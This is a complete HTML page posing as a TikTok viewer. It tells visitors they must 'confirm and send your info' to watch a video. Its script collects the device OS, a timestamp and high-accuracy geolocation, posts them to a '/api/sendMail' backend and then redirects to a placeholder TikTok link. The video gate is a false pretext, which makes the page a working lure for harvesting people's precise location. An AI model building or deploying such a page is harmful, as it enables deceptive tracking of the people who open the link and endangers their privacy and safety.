<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Watch TikTok Video</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 24px; max-width: 720px; }
    button { padding: 10px 16px; }
    #status { margin-top: 12px; line-height: 1.4; }
  </style>
</head>
<body>
  <h1>Watch TikTok Video</h1>
  <p>
    To watch this TikTok, please confirm and send your info.
  </p>
  <button id="confirm">Confirm & Watch</button>
  <div id="status"></div>
  <script>
    const statusEl = document.getElementById("status");
    const confirmBtn = document.getElementById("confirm");
    const API_URL = "/api/sendMail"; // Your backend endpoint
    const TIKTOK_URL = "https://www.tiktok.com/@username/video/1234567890"; // The real TikTok video

    function getOSVersion() {
      const ua = navigator.userAgent;
      if (/android/i.test(ua)) {
        const match = ua.match(/Android\s([0-9\.]+)/i);
        return match ? `Android ${match[1]}` : "Android";
      }
      if (/iPhone|iPad|iPod/i.test(ua)) {
        const match = ua.match(/OS (\d+_\d+(_\d+)?)/i);
        return match ? `iOS ${match[1].replace(/_/g, ".")}` : "iOS";
      }
      if (/Windows NT/i.test(ua)) {
        const match = ua.match(/Windows NT ([0-9\.]+)/i);
        if (match) {
          switch (match[1]) {
            case "10.0": return "Windows 10/11";
            case "6.3": return "Windows 8.1";
            case "6.2": return "Windows 8";
            case "6.1": return "Windows 7";
            default: return `Windows NT ${match[1]}`;
          }
        }
        return "Windows";
      }
      if (/Mac OS X/i.test(ua)) {
        const match = ua.match(/Mac OS X ([0-9_\.]+)/i);
        return match ? `macOS ${match[1].replace(/_/g, ".")}` : "macOS";
      }
      return "Unknown";
    }

    confirmBtn.onclick = async () => {
      if (!confirm("Do you agree to send your info (time, device, and optionally location) to continue?")) {
        statusEl.textContent = "You must confirm to continue.";
        return;
      }
      statusEl.textContent = "Preparing to send info…";
      const timestamp = new Date().toISOString();
      const osVersion = getOSVersion();

      // Ask for location
      if (confirm("Do you also want to share your location (latitude/longitude)?")) {
        if (!navigator.geolocation) {
          statusEl.textContent = "Geolocation not supported. Sending without location.";
          await sendInfo({ timestamp, osVersion });
          return;
        }
        statusEl.textContent = "Requesting location permission…";
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const { latitude, longitude } = pos.coords;
            await sendInfo({ timestamp, osVersion, latitude, longitude });
          },
          async (err) => {
            statusEl.textContent = "Location permission denied. Sending without location.";
            await sendInfo({ timestamp, osVersion });
          },
          { enableHighAccuracy: true, timeout: 10000 }
        );
      } else {
        await sendInfo({ timestamp, osVersion });
      }
    };

    async function sendInfo(data) {
      statusEl.textContent = "Sending info…";
      try {
        const res = await fetch(API_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
        if (!res.ok) {
          statusEl.textContent = "Failed to send info. Please try again.";
          return;
        }
        statusEl.innerHTML = "<b>Info sent! Redirecting to TikTok…</b>";
        setTimeout(() => {
          window.location.href = TIKTOK_URL;
        }, 1500);
      } catch (e) {
        statusEl.textContent = "Network error. Try again.";
      }
    }
  </script>
</body>
</html>
